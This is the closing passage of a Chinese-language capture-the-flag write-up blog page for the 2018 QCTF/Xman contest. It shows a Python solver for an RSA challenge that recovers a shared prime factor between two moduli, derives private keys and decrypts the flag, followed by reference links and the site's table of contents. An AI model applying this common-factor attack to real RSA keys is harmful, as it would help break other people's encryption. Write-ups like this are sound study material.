class="string">'ciphertext'</span>, <span class="string">'rb'</span>)</span><br><span class="line">c1 = f.readline()</span><br><span class="line">c2 = f.readline()</span><br><span class="line">f.close()</span><br><span class="line">c1 = int(c1, <span class="number">16</span>)</span><br><span class="line">c2 = int(c2, <span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'c1:'</span>, c1</span><br><span class="line"><span class="keyword">print</span> <span class="string">'c2:'</span>, c2</span><br><span class="line">e = <span class="number">0x1001</span></span><br><span class="line">p1 = gmpy2.gcd(n1, n2)</span><br><span class="line">p2 = n1 / p1</span><br><span class="line">p3 = n2 / p1</span><br><span class="line">d1 = gmpy2.invert(e, (p1 - <span class="number">1</span>) * (p2 - <span class="number">1</span>))</span><br><span class="line">d2 = gmpy2.invert(e, (p1 - <span class="number">1</span>) * (p3 - <span class="number">1</span>))</span><br><span class="line">m1 = pow(c1, d1, n1)</span><br><span class="line">m2 = pow(c2, d2, n2)</span><br><span class="line">msg1 = hex(m1)[<span class="number">2</span>:].decode(<span class="string">'hex'</span>)</span><br><span class="line">msg2 = hex(m2)[<span class="number">2</span>:].decode(<span class="string">'hex'</span>)</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(msg1 + msg2)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        flag += msg1[i / <span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += msg2[i / <span class="number">2</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'flag:'</span>, flag</span><br></pre></td></tr></table></figure>
<h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="https://ihomura.cn/2018/07/15/WriteUp-QCTF-Xman-babymips/" target="_blank" rel="noopener">https://ihomura.cn/2018/07/15/WriteUp-QCTF-Xman-babymips/</a><br><a href="https://www.xctf.org.cn/library/details/8723e039db0164e2f7345a12d2edd2a5e800adf7/" target="_blank" rel="noopener">https://www.xctf.org.cn/library/details/8723e039db0164e2f7345a12d2edd2a5e800adf7/</a><br><a href="https://ihomura.cn/2018/07/15/WriteUp-QCTF-Xman-stack2/" target="_blank" rel="noopener">https://ihomura.cn/2018/07/15/WriteUp-QCTF-Xman-stack2/</a><br><a href="https://www.xmsec.cc/stackoverflow-ropbasic/" target="_blank" rel="noopener">https://www.xmsec.cc/stackoverflow-ropbasic/</a><br><a href="https://blog.csdn.net/xuchen16/article/details/81080580" target="_blank" rel="noopener">https://blog.csdn.net/xuchen16/article/details/81080580</a><br><a href="https://blog.csdn.net/xuchen16/article/details/81064079" target="_blank" rel="noopener">https://blog.csdn.net/xuchen16/article/details/81064079</a><br><a href="http://www.freebuf.com/column/177864.html" target="_blank" rel="noopener">http://www.freebuf.com/column/177864.html</a><br><a href="https://introspelliam.github.io/2018/03/27/crypto/RSA-Least-Significant-Bit-Oracle-Attack/" target="_blank" rel="noopener">https://introspelliam.github.io/2018/03/27/crypto/RSA-Least-Significant-Bit-Oracle-Attack/</a><br><a href="http://www.cnblogs.com/semishigure/p/9318258.html" target="_blank" rel="noopener">http://www.cnblogs.com/semishigure/p/9318258.html</a></p>

      
    </div>
    <footer class="entry-meta entry-footer">
      
      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/">wp</a></li></ul>

      
        
	<div id="comment">
		<!-- 来必力City版安装代码 -->
		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
		<script type="text/javascript">
		   (function(d, s) {
		       var j, e = d.getElementsByTagName(s)[0];

		       if (typeof LivereTower === 'function') { return; }

		       j = d.createElement(s);
		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
		       j.async = true;

		       e.parentNode.insertBefore(j, e);
		   })(document, 'script');
		</script>
		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
		</div>
		<!-- City版安装代码已完成 -->
	</div>



      
    </footer>
    <hr class="entry-footer-hr">
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2018/07/26/解决Mac下sublime-text中文出现乱码/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          解决Mac下sublime text中文出现乱码
        
      </div>
    </a>
  
  
    <a href="/2018/07/11/PWN入门（三）/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">PWN入门（三）</div>
    </a>
  
</nav>

  
</article>

<!-- Table of Contents -->

  <aside id="sidebar">
    <div id="toc" class="toc-article">
    <strong class="toc-title">Contents</strong>
    
      <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#MISC"><span class="nav-number">1.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#picture"><span class="nav-number">1.1.</span> <span class="nav-text">picture</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Noise"><span class="nav-number">1.2.</span> <span class="nav-text">Noise</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#X-man-Keyword"><span class="nav-number">1.3.</span> <span class="nav-text">X-man-Keyword</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#X-man-A-face"><span class="nav-number">1.4.</span> <span class="nav-text">X-man-A face</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number">2.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Lottery"><span class="nav-number">2.1.</span> <span class="nav-text">Lottery</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NewsCenter"><span class="nav-number">2.2.</span> <span class="nav-text">NewsCenter</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#RE"><span class="nav-number">3.</span> <span class="nav-text">RE</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Xman-babymips"><span class="nav-number">3.1.</span> <span class="nav-text">Xman-babymips</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#asong"><span class="nav-number">3.2.</span> <span class="nav-text">asong</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ollvm"><span class="nav-number">3.3.</span> <span class="nav-text">ollvm</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PWN"><span class="nav-number">4.</span> <span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Xman-dice-game"><span class="nav-number">4.1.</span> <span class="nav-text">Xman-dice_game</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Xan-stack2"><span class="nav-number">4.2.</span> <span class="nav-text">Xan-stack2</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Crypto"><span class="nav-number">5.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#babyRSA"><span class="nav-number">5.1.</span> <span class="nav-text">babyRSA</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Xman-RSA"><span class="nav-number">5.2.</span> <span class="nav-text">Xman-RSA</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考网站"><span class="nav-number">6.</span> <span class="nav-text">参考网站</span></a></li></ol>
    
    </div>
  </aside>
</section>
        
      </div>

    </div>
    <!-- <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
    <a href="/tags" class="mobile-nav-link">Tags</a>
  
    <a href="/about" class="mobile-nav-link">About</a>
  
</nav> -->
    <footer id="footer" class="site-footer">
  

  <div class="clearfix container">
      <div class="site-info">
	      &copy; 2019 AssassinQ All Rights Reserved.
        
      </div>
      <div class="site-credit">
        Theme by <a href="https://github.com/iTimeTraveler/hexo-theme-hipaper" target="_blank">hipaper</a>
      </div>
  </div>
</footer>


<!-- min height -->

<script>
    var wrapdiv = document.getElementById("wrap");
    var contentdiv = document.getElementById("content");

    wrapdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";


    <!-- headerblur min height -->
    
      var headerblur = document.getElementById("header-blur");
      headerblur.style.minHeight = window.getComputedStyle(document.getElementById("allheader"), null).height;
    
    
</script>
    
<div style="display: none;">
  <script src="https://s11.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
</div>

<!-- mathjax config similar to math.stackexchange -->

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>
<script src="/js/bootstrap.js"></script>
<script src="/js/main.js"></script>







  <div style="display: none;">
    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
  </div>








  </div>

  <a id="rocket" href="#top" class=""></a>
  <script type="text/javascript" src="/js/totop.js" async=""></script>
</body>
</html>
